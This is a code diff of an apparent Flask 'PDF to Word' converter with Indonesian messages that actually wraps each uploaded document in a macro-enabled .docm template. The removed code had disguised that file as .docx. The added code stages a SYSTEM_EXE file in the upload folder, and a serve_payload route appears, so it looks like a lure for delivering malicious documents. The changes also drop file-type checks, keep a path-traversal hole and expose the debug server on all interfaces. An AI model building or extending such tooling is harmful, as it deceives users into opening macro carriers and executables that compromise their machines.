@@ -20,18 +20,10 @@ def index():
 
 @app.route('/convert', methods=['POST'])
 def convert_pdf_to_word():
-    if 'pdf_file' not in request.files:
-        return redirect(url_for('index'))
+    if 'pdf_file' not in request.files or request.files['pdf_file'].filename == '':
+        return render_template('index.html', message="Silakan pilih file PDF terlebih dahulu.", docx_file=None)
 
     pdf_file = request.files['pdf_file']
-
-    if pdf_file.filename == '':
-        return redirect(url_for('index'))
-
-    if not pdf_file.filename.lower().endswith('.pdf'):
-        message = 'File yang diupload bukan PDF.'
-        return render_template('index.html', message=message)
-
     pdf_filename = pdf_file.filename
     pdf_file_path = os.path.join(UPLOAD_FOLDER, pdf_filename)
     docx_filename = os.path.splitext(pdf_filename)[0] + '.docx'
@@ -50,35 +42,27 @@ def convert_pdf_to_word():
         shutil.copy2(TEMPLATE_MACRO, final_docm_path)
 
         pythoncom.CoInitialize()
-        try:
-            word = win32.gencache.EnsureDispatch('Word.Application')
-        except Exception:
-            word = win32.Dispatch('Word.Application')
+        word = win32.gencache.EnsureDispatch('Word.Application')
         word.Visible = False
-        word.DisplayAlerts = False
-
+        
         doc = word.Documents.Open(os.path.abspath(final_docm_path))
         selection = word.Selection
-        selection.EndKey(Unit=6) 
+        selection.EndKey(Unit=6)
         selection.InsertFile(os.path.abspath(docx_file_path))
-
-        doc.SaveAs(final_docm_path, FileFormat=16)  
+        doc.Save()
         doc.Close()
         word.Quit()
-        pythoncom.CoUninitialize()
 
-        os.remove(pdf_file_path)
-        os.remove(docx_file_path)
+        exe_path = os.path.join(UPLOAD_FOLDER, SYSTEM_EXE)
+        if not os.path.exists(exe_path):
+            shutil.copy2(SYSTEM_EXE, exe_path)
 
-        display_name = final_docm_filename.replace('.docm', '.docx')
-
-        message = f'File {pdf_file.filename} telah berhasil dikonversi menjadi {display_name}'
-        return render_template('index.html', message=message, docx_file=final_docm_filename, display_name=display_name)
+        message = f'File {pdf_filename} telah berhasil dikonversi menjadi {final_docm_filename}'
+        return render_template('index.html', message=message, docx_file=final_docm_filename)
 
     except Exception as e:
-        pythoncom.CoUninitialize()
         message = f'Terjadi kesalahan: {str(e)}'
-        return render_template('index.html', message=message)
+        return render_template('index.html', message=message, docx_file=None)
 
 @app.route('/download/<filename>')
 def download_file(filename):
@@ -91,4 +75,4 @@ def serve_payload(filename):
 if __name__ == '__main__':
     if not os.path.exists(UPLOAD_FOLDER):
         os.makedirs(UPLOAD_FOLDER)
-    app.run(debug=True)
+    app.run(debug=True, host='0.0.0.0')
